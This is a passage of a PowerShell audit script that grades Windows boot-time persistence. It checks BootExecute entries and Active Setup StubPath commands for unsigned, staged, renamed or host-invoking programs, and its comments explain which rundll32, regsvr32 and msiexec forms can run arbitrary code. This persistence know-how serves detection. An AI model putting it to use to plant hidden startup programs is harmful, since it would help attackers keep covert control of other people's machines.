    # A quoted image is read whole. If Session Manager does not honour the
    # quotes nothing runs; if it does, this is the file.
    if ($e.StartsWith('"')) { $q = $e.IndexOf('"', 1); if ($q -gt 1) { $tok = $e.Substring(1, $q - 1).Trim(' ', "`t") } }
    if (-not $tok) { return '' }
    if ($tok -match '^\\\?\?\\(?i:UNC)\\') { return ('\\' + $tok.Substring(8)) }
    if ($tok -match '^\\\?\?\\[A-Za-z]:[\\/]') { $tok = $tok.Substring(4) }
    elseif ($tok -match '^(?i)\\SystemRoot\\') { $tok = $SystemRoot.TrimEnd('\') + $tok.Substring(11) }
    elseif ($tok -match '^[\\/]') { return $tok }
    elseif ($tok -notmatch '^[A-Za-z]:[\\/]') { $tok = Join-WinPath (Join-WinPath $SystemRoot 'System32') $tok }
    $tok = $tok -replace '/', '\'
    if ((Get-WinLeaf $tok) -notmatch '\.') { $tok = $tok + '.exe' }
    return (Get-NormalWinPath $tok)
}

# PURE. One BootExecute-family entry. $Facts is Get-FileFacts' answer for the
# image. Only the stock autochk entry is OK.
function Get-BootEntryVerdict {
    param([string]$Value, [string]$Entry, [string]$Image, $Facts, [string]$SystemRoot = $env:SystemRoot)
    $e = Get-CleanText $Entry
    $img = Get-CleanText $Image
    if (Test-AutochkEntry $Entry) { return @{ Sev = 'OK'; Line = "[OK] ${Value}: $e (Windows' boot-time disk check, the stock entry)" } }
    if (([string]$Entry).Length -gt $script:MaxBootEntryLength) { return @{ Sev = 'WARNING'; Line = "[WARNING] $Value entry is $(([string]$Entry).Length) characters long -- not parsed; no boot program needs that. It begins: $($e.Substring(0, [Math]::Min(120, $e.Length))) (T1547.001)." } }
    $run = "$Value entry '$e' runs $img before Windows starts, as SYSTEM"
    if (Test-StagingText $Image) { return @{ Sev = 'CRITICAL'; Line = "[CRITICAL] $run, from a staging path (T1547.001)." } }
    $st = [string]$Facts.State
    if ($st -eq 'notlocal' -or $st -eq 'reparse') { return @{ Sev = 'WARNING'; Line = "[WARNING] $Value entry '$e' names $img, which is not a plain file on a local fixed drive -- not opened by this audit. Session Manager would run it before Windows starts (T1547.001)." } }
    if ($st -eq 'absent' -or $st -eq 'dir') { return @{ Sev = 'WARNING'; Line = "[WARNING] $Value entry '$e' names $img, which is not on disk -- Windows skips it at boot. A leftover of uninstalled software, or an implant whose file was removed or is yet to be dropped (T1547.001)." } }
    if ($st -eq 'unread') { return @{ Sev = 'WARNING'; Line = "[WARNING] $Value entry '$e' names $img, whose file could not be read ($($Facts.Why)) -- not graded (T1547.001)." } }
    if ($st -eq 'unverified') { return @{ Sev = 'WARNING'; Line = "[WARNING] $run, and its signature could not be verified ($($Facts.Why)) (T1547.001)." } }
    if ($st -ne 'signed') { return @{ Sev = 'CRITICAL'; Line = "[CRITICAL] $run, and it is not validly signed ($($Facts.Status)) (T1547.001)." } }
    $real = [string]$Facts.RealPath
    if (-not $real) { $real = $Image }
    if (Test-StagingText $real) { return @{ Sev = 'CRITICAL'; Line = "[CRITICAL] $run, from a staging path ($(Get-CleanText $real)) (T1547.001)." } }
    $sys32 = (Join-WinPath $SystemRoot 'System32') + '\'
    if ($Facts.Microsoft -and $real.StartsWith($sys32, [StringComparison]::OrdinalIgnoreCase)) {
        return @{ Sev = 'WARNING'; Line = "[WARNING] $run -- signed by $($Facts.CN), but it is not the disk check. Windows servicing can leave a program here while an update waits for a restart: restart, then run the audit again. A native tool does what it is told (autofmt formats a volume), so read the whole entry (T1547.001)." }
    }
    return @{ Sev = 'WARNING'; Line = "[WARNING] $run -- signed by $($Facts.CN). Antivirus boot-time scanners register here; anything else is persistence (T1547.001)." }
}

# PURE. The BootExecute family as a whole. $Reads maps each value name to a
# Read-RegValueState answer; $Probe and $DriveKind are Get-FileFacts'.
function Get-BootReport {
    param([hashtable]$Reads, [scriptblock]$Probe, [scriptblock]$DriveKind, [string]$KeyLabel, [string]$SystemRoot = $env:SystemRoot)
    $lines = New-Object System.Collections.Generic.List[string]
    $sev = 'OK'; $gap = 'OK'; $hits = New-Object System.Collections.Generic.List[string]
    $n = 0
    foreach ($v in $script:BootValues) {
        $r = $Reads[$v]
        if ($null -eq $r) { continue }
        if ($r.State -eq 'nokey') {
            if ($v -eq 'BootExecute') { $lines.Add("[WARNING] BootExecute check NOT performed -- the Session Manager key ($KeyLabel) is not there. Every Windows has it, so the read did not reach the real key; a program run before Windows starts would go unseen (T1547.001)."); $gap = 'WARNING' }
            continue
        }
        if ($r.State -eq 'unreadable') {
            $lines.Add("[WARNING] $v check NOT performed -- $KeyLabel could not be read ($($r.Error)), so a program run before Windows starts would go unseen (T1547.001).")
            $gap = 'WARNING'; continue
        }
        if ($r.State -eq 'absent') {
            if ($v -eq 'BootExecute') { $lines.Add("[INFO] BootExecute value absent -- Windows normally holds 'autocheck autochk *' there, so the boot-time disk check is not registered. Nothing runs from it.") }
            continue
        }
        # Windows writes these values as text (REG_MULTI_SZ). Any other kind
        # is not a form Windows writes, and is not read as a list of bytes.
        $kind = [string]$r.Kind
        if ($kind -and @('MultiString', 'String', 'ExpandString') -notcontains $kind) {
            $lines.Add("[WARNING] $v entry is not text: the value is stored as $kind, which Windows never writes there -- not graded as a program; read it by hand (T1547.001).")
            $sev = Get-MaxSev $sev 'WARNING'; continue
        }
        $entries = @($r.Value | ForEach-Object { [string]$_ } | Where-Object { $_.Trim(' ', "`t") })
        if ($entries.Count -gt $script:MaxBootEntries) {
            $lines.Add("[WARNING] $v entry list holds $($entries.Count) entries; only the first $($script:MaxBootEntries) were graded -- Windows keeps one there (T1547.001).")
            $sev = Get-MaxSev $sev 'WARNING'
            $entries = @($entries | Select-Object -First $script:MaxBootEntries)
        }
        foreach ($e in $entries) {
            $n++
            $img = ''
            $facts = @{ State = 'signed' }
            if (-not (Test-AutochkEntry $e) -and $e.Length -le $script:MaxBootEntryLength) {
                $img = Get-NativeImagePath -Entry $e -SystemRoot $SystemRoot
                if ($img -and -not (Test-StagingText $img)) { $facts = Get-FileFacts $img $Probe $DriveKind }
            }
            $x = Get-BootEntryVerdict -Value $v -Entry $e -Image $img -Facts $facts -SystemRoot $SystemRoot
            $lines.Add($x.Line)
            if ($x.Sev -ne 'OK') {
                $sev = Get-MaxSev $sev $x.Sev
                if ($img -and @('signed', 'unsigned', 'unverified') -contains [string]$facts.State -and -not (Test-StagingText $img)) { $hits.Add([string]$facts.RealPath) }
            }
        }
    }
    if ($sev -eq 'OK' -and $gap -eq 'OK') { $lines.Add("[OK] BootExecute and its sibling values hold only Windows' own entries ($n graded).") }
    return @{ Lines = @($lines.ToArray()); Sev = $sev; Gap = $gap; Hits = @($hits.ToArray()) }
}

# PURE. The path one CreateProcess try names: a forward slash is a separator
# to Windows, and .exe is added when the last name has no extension (a name
# that ends in a period has one, an empty one).
function Get-TryPath {
    param([string]$Prefix)
    $t = ([string]$Prefix) -replace '/', '\'
    if ((Get-WinLeaf $t) -notmatch '\.') { $t = $t + '.exe' }
    return $t
}

# PURE (the disk only through Get-FileFacts and Find-OnSearchPath). The
# program a command line runs, found the way CreateProcess finds it: every
# whitespace-separated prefix in turn, the first that exists. Returns @{
#   Shape  found | notfound | notlocal | relative | none
#   Program, Facts, Rest (what follows the program)
#   Tried  every place looked and found absent, in order
#   Named  the place a reader would call "the program" (for the message)
#   Bare   the first word has no folder
#   Unsure a later reading of the line that is not a plain local file, so it
#          was not opened and cannot be ruled out
#   Truncated  the line has more words than are tried
#   First  the first try, as text }
function Resolve-StubProgram {
    param([string]$Line, [scriptblock]$Probe, [scriptblock]$DriveKind, [scriptblock]$Which, [string]$SystemRoot, [string]$SystemDrive)
    $out = @{ Shape = 'none'; Program = ''; Facts = $null; Rest = ''; Tried = @(); Named = ''; Bare = $false; Unsure = ''; Truncated = $false; First = '' }
    $l = ([string]$Line).Trim(' ', "`t")
    if (-not $l) { return $out }
    $cands = New-Object System.Collections.Generic.List[object]
    if ($l.StartsWith('"')) {
        $end = $l.IndexOf('"', 1)
        if ($end -lt 2) { return $out }
        $q = $l.Substring(1, $end - 1).Trim(' ', "`t")
        if (-not $q) { return $out }
        $cands.Add(@{ Pre = $q; Rest = $l.Substring($end + 1); ArgLike = $false })
    } else {
        $tries = @(Get-CreateProcessTries $l)
        if ($tries.Count -ge $script:MaxTries) { $out.Truncated = $true }
        foreach ($t in $tries) {
            $try = [string]$t.Try
            $pre = $try
            if (-not $l.StartsWith($try, [StringComparison]::OrdinalIgnoreCase)) { $pre = $try.Substring(0, [Math]::Max(0, $try.Length - 4)) }
            $cands.Add(@{ Pre = $pre; Rest = $l.Substring([Math]::Min($pre.Length, $l.Length)); ArgLike = [bool]$t.ArgLike })
        }
    }
    if ($cands.Count -eq 0) { return $out }
    $out.First = Get-TryPath ([string]$cands[0].Pre)
    $out.Bare = ($out.First -notmatch '\\')
    $out.Shape = 'notfound'
    $tried = New-Object System.Collections.Generic.List[string]
    $named = ''; $lastPlain = ''; $sawArg = $false
    for ($i = 0; $i -lt $cands.Count; $i++) {
        $c = $cands[$i]
        $text = Get-TryPath ([string]$c.Pre)
        if ($c.ArgLike) { $sawArg = $true }
        $path = ''
        if ($text -match '^\\\\') {
            if ($i -eq 0) { $out.Shape = 'notlocal'; $out.Program = $text }
            break
        }
        if ($text -match '^[A-Za-z]:\\') { $path = $text }
        elseif ($text -match '^\\') { $path = $SystemDrive.TrimEnd('\') + $text }
        elseif ($text -match '\\') {
            # A relative path with a folder lands wherever Windows starts the
            # command; this check cannot place it.
            if ($i -eq 0) { $out.Shape = 'relative'; $out.Program = $text }
            break
        } else {
            if (-not (Test-PlainName $text)) {
                if ($i -eq 0) { $out.Shape = 'notlocal'; $out.Program = $text }
                break
            }
            $w = Find-OnSearchPath $text $Which
            if (-not $w) { [void]$tried.Add($text); continue }
            $path = $w
        }
        $f = Get-FileFacts $path $Probe $DriveKind
        $real = [string]$f.RealPath
        if ($f.State -eq 'reparse') {
            $out.Shape = 'notlocal'; $out.Program = $real; $out.Facts = $f
            break
        }
        if ($f.State -eq 'notlocal') {
            if ($i -eq 0) { $out.Shape = 'notlocal'; $out.Program = $real; $out.Facts = $f; break }
            # A longer reading of the line. One no file can have is not a
            # program; one that could exist but may not be opened (a stream,
            # a device) is a place Windows might still run something from.
            if (Test-ImpossibleName $real) { break }
            if (-not $out.Unsure) { $out.Unsure = $real }
            continue
        }
        if ($f.State -eq 'absent' -or $f.State -eq 'dir') {
            [void]$tried.Add($real)
            if (-not $sawArg) {
                $lastPlain = $real
                if (-not $named -and (Get-WinLeaf (([string]$c.Pre) -replace '/', '\')) -match '\.') { $named = $real }
            }
            continue
        }
        $out.Shape = 'found'; $out.Program = $real; $out.Facts = $f; $out.Rest = [string]$c.Rest
        break
    }
    $out.Tried = @($tried.ToArray())
    if (-not $named) { $named = $lastPlain }
    if (-not $named -and $tried.Count) { $named = $tried[$tried.Count - 1] }
    if (-not $named) { $named = $out.First }
    $out.Named = $named
    return $out
}

# PURE. What a program is, for this check. Kind:
#   scripthost | interpreter | vendor            (any signer)
#   stock-inert | stock-rundll | stock-regsvr | stock-msi | ms-other
# Renamed: a Microsoft file whose own version resource names another program
# -- a host (cmd.exe as helper.exe) anywhere, or any other name on a file in
# System32 or SysWOW64 (ie4uinit.exe replaced by another signed program).
function Get-ProgramClass {
    param([string]$Path, $Facts, [string]$SystemRoot)
    $leaf = (Get-WinLeaf $Path).ToLowerInvariant()
    $orig = (([string]$Facts.OriginalName).Trim().ToLowerInvariant()) -replace '\.mui$', ''
    $ms = [bool]$Facts.Microsoft
    $out = @{ Leaf = $leaf; Name = $leaf; Original = $orig; Renamed = $false; Kind = 'vendor' }
    $root = [regex]::Escape($SystemRoot.TrimEnd('\'))
    $pf = [regex]::Escape($SystemRoot.Substring(0, 2)) + '\\Program Files(?: \(x86\))?'
    $inSys = ($Path -match ('^(?i)' + $root + '\\(?:System32|SysWOW64)\\[^\\]+$'))
    if ($ms -and $orig -and $orig -ne $leaf -and ($inSys -or $script:HostLeaves -contains $orig)) {
        $out.Renamed = $true; $out.Name = $orig
    }
    if ($script:ScriptHostNames -contains $out.Name -or $script:ScriptHostNames -contains $leaf) { $out.Kind = 'scripthost'; return $out }
    if (-not $ms) {
        if ($leaf -match $script:InterpreterRx) { $out.Kind = 'interpreter'; return $out }
        if ($Path -match ('^(?i)' + $pf + '\\Google\\Chrome\\Application\\[\d.]+\\Installer\\chrmstp\.exe$') -and [string]$Facts.CN -eq 'Google LLC') { $out.Kind = 'stock-inert' }
        return $out
    }
    $out.Kind = 'ms-other'
    if ($inSys) {
        if ($leaf -eq 'ie4uinit.exe' -or $leaf -eq 'unregmp2.exe') { $out.Kind = 'stock-inert' }
        elseif ($leaf -eq 'rundll32.exe') { $out.Kind = 'stock-rundll' }
        elseif ($leaf -eq 'regsvr32.exe') { $out.Kind = 'stock-regsvr' }
        elseif ($leaf -eq 'msiexec.exe') { $out.Kind = 'stock-msi' }
        return $out
    }
    if ($Path -match ('^(?i)' + $pf + '\\Microsoft\\Edge(?: Beta| Dev)?\\Application\\[\d.]+\\Installer\\setup\.exe$')) { $out.Kind = 'stock-inert'; return $out }
    if ($Path -match ('^(?i)' + $pf + '\\Windows Mail\\WinMail\.exe$')) { $out.Kind = 'stock-inert'; return $out }
    return $out
}

# PURE. The arguments of a command line, split the way Windows splits them
# (spaces and tabs outside double quotes). Not Ok when a quote is left open
# or there are more than any setup command carries.
function Get-ArgTokens {
    param([string]$Rest)
    $r = [string]$Rest
    $out = @{ Ok = $true; Why = ''; Tokens = @() }
    if ((($r.Length - $r.Replace('"', '').Length) % 2) -ne 0) { $out.Ok = $false; $out.Why = 'a quote that is never closed'; return $out }
    $list = New-Object System.Collections.Generic.List[object]
    foreach ($m in [regex]::Matches($r, '(?:[^ \t"]+|"[^"]*")+')) {
        $list.Add(@{ Text = ($m.Value -replace '"', ''); Quoted = ($m.Value.IndexOf('"') -ge 0); Index = $m.Index })
        if ($list.Count -gt $script:MaxArgTokens) { $out.Ok = $false; $out.Why = "more than $($script:MaxArgTokens) arguments"; return $out }
    }
    $out.Tokens = @($list.ToArray())
    return $out
}

# PURE. "<dll>,<entry point>" as rundll32 reads it: the DLL is a quoted
# string, or runs to the first comma and holds no space; the entry point is
# a name. Tail is whatever follows -- text handed to the entry point, and
# the entry points that take something (LaunchApplication, RegisterOCX,
# Control_RunDLL <cpl> ...) run it.
function Get-DllSpec {
    param([string]$Spec)
    $s = ([string]$Spec).Trim(' ', "`t")
    $out = @{ Ok = $false; Dll = ''; Export = ''; Tail = '' }
    $m = [regex]::Match($s, '^"([^"]+)"[ \t]*,[ \t]*([^ \t,]+)[ \t]*(.*)$')
    if (-not $m.Success) { $m = [regex]::Match($s, '^([^ \t,"]+),[ \t]*([^ \t,]+)[ \t]*(.*)$') }
    if (-not $m.Success) { return $out }
    if ($m.Groups[2].Value -notmatch $script:RxExport) { return $out }
    $out.Ok = $true
    $out.Dll = $m.Groups[1].Value.Trim(' ', "`t")
    $out.Export = $m.Groups[2].Value
    $out.Tail = $m.Groups[3].Value.Trim(' ', "`t")
    return $out
}

# PURE. Can every argument of a known setup program be accounted for?
# Returns @{ Ok; Why (the text that could not be); Files = @( @{ Text; Dll;
# Sys } ) still to be verified; ByCode (msiexec named a product code); Known
# (the line is one Windows, Edge or Chrome keeps -- still subject to the
# files verifying, and to a Sys file being in System32 or SysWOW64) }.
function Get-StockArgAccount {
    param([string]$Kind, [string]$Rest, [string]$Leaf = '')
    $out = @{ Ok = $true; Why = ''; Files = @(); ByCode = $false; Known = $false }
    $files = New-Object System.Collections.Generic.List[object]
    $t = Get-ArgTokens $Rest
    if (-not $t.Ok) { $out.Ok = $false; $out.Why = [string]$t.Why; return $out }
    $tokens = @($t.Tokens)
    if ($Kind -eq 'stock-inert') {
        $known = @($script:KnownArgs[$Leaf.ToLowerInvariant()])
        $all = ($tokens.Count -gt 0)
        foreach ($k in $tokens) {
            $x = [string]$k.Text
            if ($k.Quoted -or ($x -notmatch $script:RxSwitch -and $x -notmatch $script:RxWord)) { $out.Ok = $false; $out.Why = $x; return $out }
            if ($known -notcontains $x) { $all = $false }
        }
        $out.Known = $all
        return $out
    }
    if ($Kind -eq 'stock-rundll') {
        # No switch before the DLL: `rundll32 -sta {CLSID}` runs whatever COM
        # object that class id names.
        $spec = ([string]$Rest).Trim(' ', "`t")
        $d = Get-DllSpec $spec
        if (-not $d.Ok) { $out.Ok = $false; $out.Why = $(if ($spec) { $spec } else { 'no DLL' }); return $out }
        $key = (Get-WinLeaf (([string]$d.Dll) -replace '/', '\')) + ',' + $d.Export
        if ($d.Tail) { $key = $key + ' ' + ((([string]$d.Tail) -split '[ \t]+') -join ' ') }
        $out.Known = ($script:KnownDllCalls -contains $key)
        # Text after an entry point is handed to it. Only a known line may
        # carry any.
        if ($d.Tail -and -not $out.Known) { $out.Ok = $false; $out.Why = [string]$d.Tail; return $out }
        $files.Add(@{ Text = [string]$d.Dll; Dll = $true; Sys = [bool]$out.Known; Must = [bool]$d.Tail })
        $out.Files = @($files.ToArray())
        return $out
    }
    if ($Kind -eq 'stock-regsvr') {
        $sw = New-Object System.Collections.Generic.List[string]
        foreach ($k in $tokens) {
            $x = [string]$k.Text
            if (-not $k.Quoted -and $x -match $script:RxSwitch) { $sw.Add($x); continue }
            if ($x -match '^[-/]') { $out.Ok = $false; $out.Why = $x; return $out }
            $files.Add(@{ Text = $x; Dll = $true; Sys = $false; Must = $false })
        }
        if ($files.Count -eq 0) { $out.Ok = $false; $out.Why = 'no DLL'; return $out }
        if ($files.Count -eq 1) {
            # Sorted by character code, not by the machine's language rules.
            $swl = [string[]]@($sw.ToArray() | ForEach-Object { $_.ToLowerInvariant() })
            [Array]::Sort($swl, [StringComparer]::Ordinal)
            $key = (Get-WinLeaf (([string]$files[0].Text) -replace '/', '\')).ToLowerInvariant() + ' ' + ($swl -join ' ')
            if ($script:KnownRegsvr -contains $key) { $out.Known = $true; $files[0].Sys = $true }
        }
        $out.Files = @($files.ToArray())
        return $out
    }
    if ($Kind -eq 'stock-msi') {
        foreach ($k in $tokens) {
            $x = [string]$k.Text
            if ($x -match $script:RxGuid -or $x -match $script:RxSwitchGuid) { $out.ByCode = $true; continue }
            if (-not $k.Quoted -and ($x -match $script:RxSwitch -or $x -match $script:RxMsiProp)) { continue }
            if ($x -notmatch '^[-/]' -and $x -match '(?i)\.(msi|msp|mst)$') { $files.Add(@{ Text = $x; Dll = $false; Sys = $false; Must = $false }); continue }
            $out.Ok = $false; $out.Why = $x; return $out
        }
        if ($files.Count -eq 0 -and -not $out.ByCode) { $out.Ok = $false; $out.Why = $(if ($tokens.Count) { 'no package' } else { 'no arguments' }); return $out }
        $out.Files = @($files.ToArray())
        return $out
    }
    $out.Ok = $false; $out.Why = 'an unknown kind of program'
    return $out
}

# PURE (the disk only through Get-FileFacts and Find-OnSearchPath). A file a
# known setup program is handed: Get-FileFacts' answer for the file Windows
# would load, or a State of 'relative' (a path this check cannot place),
# 'unplaced' (a name without a folder that is nowhere on the search path) or
# 'notlocal'. A name with no folder is looked for beside the program, in
# System32, then on the search path; a DLL named without an extension gets
# .dll, as LoadLibrary gives it.
function Get-HandedFacts {
    param([string]$Text, [bool]$Dll, [string]$HostDir, [scriptblock]$Probe, [scriptblock]$DriveKind, [scriptblock]$Which, [string]$SystemRoot)
    $t = (([string]$Text).Trim(' ', "`t")) -replace '/', '\'
    if (-not $t) { return @{ State = 'relative'; RealPath = '' } }
    if ($t -match '^\\') { return @{ State = 'notlocal'; RealPath = $t } }
    $names = New-Object System.Collections.Generic.List[string]
    $names.Add($t)
    if ($Dll -and (Get-WinLeaf $t) -notmatch '\.') { $names.Add($t + '.dll') }
    $cands = New-Object System.Collections.Generic.List[string]
    $bare = $false
    if ($t -match '^[A-Za-z]:\\') { foreach ($n in $names) { $cands.Add($n) } }
    elseif ($t -match '\\') { return @{ State = 'relative'; RealPath = $t } }
    else {
        $bare = $true
        foreach ($n in $names) {
            if (-not (Test-PlainName $n)) { return @{ State = 'notlocal'; RealPath = $t } }
            if ($HostDir) { $cands.Add((Join-WinPath $HostDir $n)) }
            $cands.Add((Join-WinPath (Join-WinPath $SystemRoot 'System32') $n))
            $w = Find-OnSearchPath $n $Which
            if ($w) { $cands.Add($w) }
        }
    }
    $first = $null
    foreach ($c in $cands) {
        $f = Get-FileFacts $c $Probe $DriveKind
        if ($null -eq $first) { $first = $f }
        if ($f.State -ne 'absent' -and $f.State -ne 'dir') { return $f }
    }
    # A name without a folder that is nowhere: wherever on the search path a
    # file by that name is put later, it would be loaded.
    if ($bare) { return @{ State = 'unplaced'; RealPath = $t } }
    if ($null -eq $first) { return @{ State = 'relative'; RealPath = $t } }
    return $first
}

# PURE. A path as an argument carries it: "<dll>,<entry>" ends at the comma,
# and a closing brace or bracket is not part of the name.
function Get-CutPath {
    param([string]$P)
    $q = ([string]$P).Trim(' ', "`t").TrimEnd('}', ')', ';', "'")
    $m = [regex]::Match($q, '^(.*?\.[A-Za-z0-9]{1,5})[,#]')
    if ($m.Success) { return $m.Groups[1].Value }
    return $q.TrimEnd(',')
}

# PURE (the disk only through Get-FileFacts). One drive path found in another
# vendor's arguments. It may hold spaces, so every reading of it is tried, as
# CreateProcess would. Returns @{ Kind; Text } or $null.
function Get-VendorPathConcern {
    param([string]$Text, [scriptblock]$Probe, [scriptblock]$DriveKind, [string]$SystemRoot)
    $full = Get-CutPath $Text
    $reads = New-Object System.Collections.Generic.List[string]
    $n = 0
    foreach ($m in [regex]::Matches($full, '[ \t]+')) {
        $n++
        if ($n -gt 8) { break }
        $reads.Add((Get-CutPath $full.Substring(0, $m.Index)))
    }
    $reads.Add($full)
    for ($i = 0; $i -lt $reads.Count; $i++) {
        $g = Get-FileFacts $reads[$i] $Probe $DriveKind
        $real = [string]$g.RealPath
        if ($g.State -eq 'reparse') { return @{ Kind = 'notlocal'; Text = $real } }
        if ($g.State -eq 'notlocal') {
            if ($i -eq 0) { return @{ Kind = 'notlocal'; Text = $real } }
            continue
        }
        if (Test-StagingText $real) { return @{ Kind = 'staged'; Text = $real } }
        if ($script:HostLeaves -contains (Get-WinLeaf $real).ToLowerInvariant()) { return @{ Kind = 'host'; Text = $real } }
        $code = ($real -match $script:CodeExtRx)
        if ($g.State -eq 'absent') {
            if ($code -and -not (Test-AdminOnlyPath $real $SystemRoot)) { return @{ Kind = 'prestaged'; Text = $real } }
            continue
        }
        if ($g.State -eq 'dir') { continue }
        # A file that exists: code by its name, or a program file whatever
        # its name (the probe read its first two bytes), must be signed.
        if (($code -or $g.Pe) -and $g.State -ne 'signed') { return @{ Kind = 'unsigned'; Text = $real } }
    }
    return $null
}

# PURE (the disk only through Get-FileFacts). What another vendor's signed
# program is handed that this check can recognise as trouble: the first of
# @{ Kind = unreadable|url|unc|notlocal|staged|host|unsigned|prestaged|
# endpoint|relative; Text }, or $null. A data file (a .xml, a .dat that is
# not a program file) is not judged: that vendor's program reads its own
# files.
function Get-VendorArgConcern {
    param([string]$Rest, [scriptblock]$Probe, [scriptblock]$DriveKind, [string]$SystemRoot)
    $t = Get-ArgTokens $Rest
    if (-not $t.Ok) { return @{ Kind = 'unreadable'; Text = [string]$t.Why } }
    foreach ($k in @($t.Tokens)) {
        $x = [string]$k.Text
        $u = [regex]::Match($x, $script:UrlRx)
        if ($u.Success) { return @{ Kind = 'url'; Text = $u.Value } }
        # (C:\\dir is a drive path written with doubled backslashes, not a
        # network path.)
        $xu = ($x -replace '/', '\') -replace '(?<![A-Za-z0-9])([A-Za-z]:)\\+', '$1\'
        $n = [regex]::Match($xu, '(?:^|[ \t:=,;({])(\\\\[^\\ \t][^ \t]*)')
        if ($n.Success) { return @{ Kind = 'unc'; Text = (Get-CutPath $n.Groups[1].Value) } }
        $outside = $x
        $d = [regex]::Match($x, '(?:^|[ \t:=,;({])([A-Za-z]:[\\/].*)$')
        if ($d.Success) {
            $outside = $x.Substring(0, $d.Groups[1].Index)
            $c = Get-VendorPathConcern -Text $d.Groups[1].Value -Probe $Probe -DriveKind $DriveKind -SystemRoot $SystemRoot
            if ($null -ne $c) { return $c }
        }
        # A plain switch is not a host: /cmd is a switch some programs have.
        if (-not $k.Quoted -and $x -match $script:RxPlainSwitch) { continue }
        $h = [regex]::Match($outside, $script:HostNameRx)
        if ($h.Success) { return @{ Kind = 'host'; Text = $h.Value } }
        $ep = [regex]::Match($outside, $script:EndpointRx)
        if ($ep.Success) { return @{ Kind = 'endpoint'; Text = $ep.Value } }
        if (-not $d.Success) {
            $r = [regex]::Match($x, '(?:^|[=:])([^=:"]*\.[A-Za-z0-9]{1,11})$')
            if ($r.Success -and $r.Groups[1].Value -match $script:CodeExtRx) { return @{ Kind = 'relative'; Text = $r.Groups[1].Value } }
        }
    }
    return $null
}

# PURE. The folders the per-user variables in a StubPath stand for, on this
# account. A path under one of them is a different file for every user.
function Get-PerUserRoots {
    param([string]$Raw)
    $roots = New-Object System.Collections.Generic.List[string]
    foreach ($m in [regex]::Matches([string]$Raw, '%([A-Za-z_][A-Za-z0-9_]*)%')) {
        $src = $script:PerUserVars[$m.Groups[1].Value.ToUpperInvariant()]
        if (-not $src) { continue }
        $v = [string][Environment]::GetEnvironmentVariable($src)
        if ($v.Length -ge 6 -and $roots -notcontains $v) { $roots.Add($v) }
    }
    return @($roots.ToArray())
}
function Test-PerUserText {
    param([string]$Text, [string[]]$Roots)
    foreach ($r in @($Roots)) { if ($r -and ([string]$Text).IndexOf($r, [StringComparison]::OrdinalIgnoreCase) -ge 0) { return $true } }
    return $false
}

# PURE. One Active Setup entry. Returns @{ Sev; Line; File } -- File is the
# program when it is a local file that exists (for the "when:" line). Every
# WARNING and CRITICAL line begins "Active Setup '<component>' StubPath",
# "... runs" or "... names": tests\assert_printed_findings_raised.ps1 and
# tools\top_findings.ps1 match on that.
function Get-StubVerdict {
    param([string]$Component, [string]$Stub, [string]$IsInstalled, [string]$Kind = 'String',
          [scriptblock]$Probe, [scriptblock]$DriveKind, [scriptblock]$Which,
          [string]$SystemRoot = $env:SystemRoot, [string]$SystemDrive = '', [string]$Shown = '', [int]$Depth = 0)
    if (-not $SystemDrive) { $SystemDrive = $SystemRoot.Substring(0, 2) }
    $label = "Active Setup '$Component'"
    $tail = "at every user's next sign-in"
    if ($Kind -and @('String', 'ExpandString') -notcontains $Kind) {
        return @{ Sev = 'WARNING'; File = ''; Line = "[WARNING] $label StubPath is not text: the value is stored as $Kind, which no setup program writes there -- read it by hand (T1547.014)." }
    }
    # The raw text decides what runs (a doubled space in a folder name is
    # part of the name); the cleaned form is only for display.
    $raw = ([string]$Stub).Trim(' ', "`t", "`r", "`n")
    $s = $Shown
    if (-not $s) { $s = Get-CleanText $raw }
    if ($raw.Length -gt $script:MaxStubLength) {
        return @{ Sev = 'WARNING'; File = ''; Line = "[WARNING] $label StubPath is $($raw.Length) characters long -- not parsed; no setup command needs that. It begins: $($s.Substring(0, [Math]::Min(120, $s.Length))) (T1547.014)." }
    }
    if ($Depth -eq 0 -and [string]$IsInstalled -eq '0') { return @{ Sev = 'OK'; File = ''; Line = "[INFO] $label is switched off (IsInstalled=0), so Windows does not run it: $s" } }
    $x = $raw
    try { $x = [Environment]::ExpandEnvironmentVariables($raw) } catch {}
    $pu = @(Get-PerUserRoots $raw)
    # Windows' own two argument-only entries, by exact text: nothing runs
    # unless a file by that name is where Windows would look.
    if ($Depth -eq 0 -and $script:StockArgOnly -ccontains $raw) {
        $where = ''; $g = $null
        if ($raw.StartsWith('/')) {
            $where = $SystemDrive.TrimEnd('\') + '\' + $raw.TrimStart('/') + '.exe'
            $g = Get-FileFacts $where $Probe $DriveKind
        } else {
            $where = $raw + '.exe'
            $w = Find-OnSearchPath $where $Which
            if ($w) { $g = Get-FileFacts $w $Probe $DriveKind }
        }
        if ($null -ne $g -and $g.State -ne 'absent' -and $g.State -ne 'dir') {
            return @{ Sev = 'WARNING'; File = ''; Line = "[WARNING] $label StubPath names no program, only arguments ($s), and Windows would find $(Get-CleanText ([string]$g.RealPath)) for it: that file runs $tail -- read what it is (T1547.014)." }
        }
        return @{ Sev = 'OK'; File = ''; Line = "[INFO] $label StubPath names no program, only arguments ($s) -- nothing by that name is where Windows would look from this account (no $where). This exact text is Windows' own entry; another account's own PATH folders are not visible from here." }
    }
    foreach ($rx in @($script:StrongContent + $script:LauncherContent)) {
        if ($x -match $rx) { return @{ Sev = 'CRITICAL'; File = ''; Line = "[CRITICAL] $label StubPath carries attack-shaped command content ($rx) and runs ${tail}: $s (T1547.014)" } }
    }
    $r = Resolve-StubProgram -Line $x -Probe $Probe -DriveKind $DriveKind -Which $Which -SystemRoot $SystemRoot -SystemDrive $SystemDrive
    if (Test-StagingText $x) {
        # CRITICAL whatever the program is; the resolved program only decides
        # whether the line says "runs" or "hands".
        $ft = Get-FirstToken $x
        $stg = @(@($r.Tried) | Where-Object { Test-StagingText $_ })
        if ($r.Shape -eq 'found' -and (Test-StagingText ([string]$r.Program))) { return @{ Sev = 'CRITICAL'; File = ''; Line = "[CRITICAL] $label StubPath runs $(Get-CleanText ([string]$r.Program)) from a staging path ${tail}: $s (T1547.014)" } }
        if ($r.Shape -eq 'notfound' -and $stg.Count) { return @{ Sev = 'CRITICAL'; File = ''; Line = "[CRITICAL] $label StubPath runs $(Get-CleanText ([string]$stg[0])) from a staging path $tail -- the file is not there yet: $s (T1547.014)" } }
        if (Test-StagingText $ft) { return @{ Sev = 'CRITICAL'; File = ''; Line = "[CRITICAL] $label StubPath runs $(Get-CleanText $ft) from a staging path ${tail}: $s (T1547.014)" } }
        $to = Get-WinLeaf ($ft -replace '/', '\')
        if ($r.Shape -eq 'found') { $to = (Get-WinLeaf ([string]$r.Program)).ToLowerInvariant() }
